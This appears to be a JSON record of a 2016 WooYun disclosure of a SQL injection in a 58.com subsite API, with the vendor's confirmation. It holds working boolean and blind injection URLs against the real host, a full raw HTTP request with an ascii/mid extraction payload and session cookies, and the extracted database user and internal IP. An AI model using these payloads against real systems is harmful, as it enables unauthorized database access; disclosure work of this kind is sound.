{"id": 74087, "wybug_id": "wooyun-2016-0167159", "wybug_title": "58同城某分站存在SQL注入", "wybug_corp": "58同城", "wybug_author": "浮萍", "wybug_date": "2016-01-04 11:37", "wybug_open_date": "2016-02-12 18:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向公众公开  简要描述： 修复不当 详细说明：   WooYun: 58到家一处SQL注入漏洞 \nhttp://jzt2.58.com/api/guest/v21/vip/info?cityid=358164604%20or%201=1&lat=22.6204214&lng=114.0728613&r=-1820211705\n\n\n\nhttp://jzt2.58.com/api/guest/v21/vip/info?cityid=358164604%20or%201=2&lat=22.6204214&lng=114.0728613&r=-1820211705\n\n\n\nhttp://jzt2.58.com/api/guest/v21/vip/info?cityid=358164604 or length(user())=28&lat=22.6204214&lng=114.0728613&r=-1820211705\n\n\n长度28   漏洞证明：  使用asciiascii(mid(lower(user()),%s,1))=%s\nGET /api/guest/v21/vip/info?cityid=358164604%20or%20ascii(mid(lower(user()),§1§,1))%20=§101§%20&lat=22.6204214&lng=114.0728613&r=-1820211705 HTTP/1.1Host: jzt2.58.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: id58=9qbh61Zn5kiPetPUF7p0hg==; city=zz; 58home=zz; 58tj_uuid=61765164-deec-41c5-b506-7749ea30e4f9; new_uv=2; als=0; bj58_new_uv=1; bj58_id58s=\"UW9qdlRxakF4RmVoMDE0MQ==\"; myfeet_tooltip=end; mcity=zz; td_cookie=150435839Connection: keep-alive\n第一位变体为1-28数字第二位为abcdefghijklmnopqrstuvwxyz0123456789@_.的ascii值\n\n重放选项 匹配设置648789519985946624变体条件丢弃 匹配648789519985946624 舍弃变体1\n\n结果\n\n\n1 1012 1093 994 1085 1116 1167 1168 1019 11410 12111 9512 11413 11914 9515 10016 10617 6418 4919 4820 4621 5722 4623 5024 4825 4626 4927 5628 57\n数据库emclottery_rw_dj@10.9.20.189最后两位会变化\nhttp://jzt2.58.com//api/guest/v21/vip/info?cityid=358164604%20or%20ascii%28mid%28lower%28user%28%29%29,27,1%29%29=55%20&lat=22.6204214&lng=114.0728613&r=-1820211705\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-04 11:55 厂商回复： 多谢对58安全的关注，已反馈给到家的同学 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}